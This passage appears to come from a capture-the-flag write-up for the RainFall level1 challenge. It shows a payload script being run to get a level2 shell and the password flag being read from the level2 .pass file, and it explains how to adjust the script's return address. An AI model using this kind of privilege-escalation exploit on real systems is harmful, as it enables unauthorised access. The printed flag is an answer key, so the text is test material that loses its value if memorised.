Read the requirements in payload.sh, then simply execute it from anywhere, here I placed it at /tmp/payload.sh:

```sh
level1@RainFall:~$ /tmp/payload.sh 
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass                                       
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

Nothing appears when executing the .sh besides the "Good... Wait what?" but you are indeed in a new shell.
*The reproduction made on source.c will probably have a completely different address tho, then you can replace ADDRESS_LITTLE_ENDIAN variable in the payload.sh script. (See README.md to know how to find the new address)*